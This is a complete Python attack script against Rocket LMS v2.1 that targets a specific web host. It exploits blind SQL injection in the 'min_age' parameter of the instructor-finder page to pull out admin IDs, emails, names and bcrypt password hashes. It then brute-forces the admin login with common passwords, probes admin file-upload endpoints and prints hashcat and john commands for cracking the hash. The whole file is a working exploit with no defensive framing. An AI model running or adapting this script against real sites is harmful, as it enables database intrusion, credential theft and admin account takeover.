#!/usr/bin/env python3
"""
SQL Injection - Admin Credential Extraction
Target: Rocket LMS v2.1
Goal: Extract admin email and password hash, then attempt login to find file upload
"""

import requests
import sys
import time

# Configuration
TARGET = "http://ccw84s4g4cgsk440c0ssookc.72.62.122.96.sslip.io/instructor-finder"
ADMIN_LOGIN = "http://ccw84s4g4cgsk440c0ssookc.72.62.122.96.sslip.io/admin/login"
PARAM = "min_age"
THRESHOLD = 150000

def check_condition(condition):
    """Send request with SQL condition and check if TRUE"""
    payload = f"1 AND ({condition})"
    try:
        response = requests.get(TARGET, params={PARAM: payload}, timeout=30)
        return len(response.text) > THRESHOLD
    except Exception as e:
        print(f"Error: {e}")
        return None

def extract_string_fast(query, max_len=100, charset=None):
    """Extract string using binary search - optimized"""
    if charset is None:
        charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@._-$!/"
    
    result = ""
    for pos in range(1, max_len + 1):
        # Check if there's a character at this position
        if not check_condition(f"LENGTH({query}) >= {pos}"):
            break
        
        # Binary search for the character
        low, high = 32, 126
        while low < high:
            mid = (low + high + 1) // 2
            if check_condition(f"ASCII(SUBSTRING({query},{pos},1)) >= {mid}"):
                low = mid
            else:
                high = mid - 1
        
        result += chr(low)
        print(f"\r[+] Extracting: {result}", end="", flush=True)
    
    print()
    return result

def get_admin_count():
    """Count admin users"""
    print("[*] Counting admin users...")
    
    for count in range(1, 20):
        if check_condition(f"(SELECT COUNT(*) FROM users WHERE role_name='admin' OR role_id=1) = {count}"):
            return count
    return 0

def get_user_by_offset(offset=0, role_filter="role_name='admin' OR role_id=1"):
    """Get user info by offset"""
    result = {}
    
    # Get ID
    print(f"\n[*] Getting user ID at offset {offset}...")
    id_query = f"(SELECT id FROM users WHERE {role_filter} LIMIT 1 OFFSET {offset})"
    user_id = extract_string_fast(id_query, 10, "0123456789")
    result['id'] = user_id
    
    # Get email
    print(f"[*] Getting email...")
    email_query = f"(SELECT email FROM users WHERE id={user_id})"
    email = extract_string_fast(email_query, 50)
    result['email'] = email
    
    # Get full_name
    print(f"[*] Getting name...")
    name_query = f"(SELECT full_name FROM users WHERE id={user_id})"
    name = extract_string_fast(name_query, 50)
    result['name'] = name
    
    # Get password hash (bcrypt - 60 chars)
    print(f"[*] Getting password hash (this takes a while)...")
    pass_query = f"(SELECT password FROM users WHERE id={user_id})"
    password = extract_string_fast(pass_query, 65)
    result['password'] = password
    
    return result

def try_common_passwords(email):
    """Try common passwords for admin login"""
    print(f"\n[*] Trying common passwords for {email}...")
    
    common_passwords = [
        "admin", "admin123", "password", "123456", "admin@123",
        "Admin123", "Admin@123", "administrator", "root", "test",
        "demo", "rocket", "rocket123", "lms", "lms123", "12345678"
    ]
    
    session = requests.Session()
    
    for pwd in common_passwords:
        try:
            # Get login page for CSRF token
            login_page = session.get(ADMIN_LOGIN, timeout=10)
            
            # Try to extract CSRF token
            import re
            csrf_match = re.search(r'name="_token" value="([^"]+)"', login_page.text)
            csrf_token = csrf_match.group(1) if csrf_match else ""
            
            # Attempt login
            login_data = {
                "_token": csrf_token,
                "email": email,
                "password": pwd,
                "remember": "on"
            }
            
            response = session.post(ADMIN_LOGIN, data=login_data, timeout=10, allow_redirects=False)
            
            if response.status_code == 302 and "/admin" in response.headers.get('Location', ''):
                print(f"[+] SUCCESS! Password found: {pwd}")
                return pwd, session
            
        except Exception as e:
            pass
    
    print("[-] No common password worked")
    return None, None

def check_for_file_upload_vuln(session):
    """Check for file upload vulnerabilities in admin panel"""
    print("\n[*] Checking for file upload endpoints...")
    
    upload_endpoints = [
        "/admin/setting/update_setting/main_logo",
        "/admin/setting/store",
        "/admin/users/store",
        "/admin/webinars/store",
        "/admin/blog/store",
        "/admin/categories/store",
        "/panel/setting/store",
    ]
    
    base_url = "http://ccw84s4g4cgsk440c0ssookc.72.62.122.96.sslip.io"
    
    for endpoint in upload_endpoints:
        try:
            response = session.get(base_url + endpoint, timeout=10)
            print(f"  {endpoint}: {response.status_code}")
        except:
            pass

def main():
    print("=" * 70)
    print("SQL Injection - Admin Credential Extraction")
    print(f"Target: {TARGET}")
    print("=" * 70)
    
    # Verify SQL injection works
    print("\n[*] Verifying SQL injection...")
    if not check_condition("1=1") or check_condition("1=2"):
        print("[-] SQL injection not working")
        sys.exit(1)
    print("[+] SQL Injection confirmed!")
    
    # Count admins
    admin_count = get_admin_count()
    print(f"[+] Found {admin_count} admin user(s)")
    
    # Extract first admin credentials
    print("\n" + "=" * 70)
    print("EXTRACTING ADMIN CREDENTIALS")
    print("=" * 70)
    
    admin_info = get_user_by_offset(0)
    
    print("\n" + "=" * 70)
    print("ADMIN CREDENTIALS EXTRACTED")
    print("=" * 70)
    print(f"ID:       {admin_info.get('id', 'N/A')}")
    print(f"Name:     {admin_info.get('name', 'N/A')}")
    print(f"Email:    {admin_info.get('email', 'N/A')}")
    print(f"Password: {admin_info.get('password', 'N/A')}")
    
    # Try common passwords
    pwd, session = try_common_passwords(admin_info['email'])
    
    if session:
        print("\n[+] Successfully logged in as admin!")
        check_for_file_upload_vuln(session)
    else:
        print("\n[*] To crack the bcrypt hash, use:")
        print(f"    hashcat -m 3200 '{admin_info.get('password', '')}' wordlist.txt")
        print(f"    john --format=bcrypt hash.txt")
    
    # Save results
    with open("admin_credentials.txt", "w") as f:
        f.write(f"Target: {TARGET}\n")
        f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"ID: {admin_info.get('id', 'N/A')}\n")
        f.write(f"Name: {admin_info.get('name', 'N/A')}\n")
        f.write(f"Email: {admin_info.get('email', 'N/A')}\n")
        f.write(f"Password Hash: {admin_info.get('password', 'N/A')}\n")
    
    print("\n[+] Results saved to admin_credentials.txt")

if __name__ == "__main__":
    main()
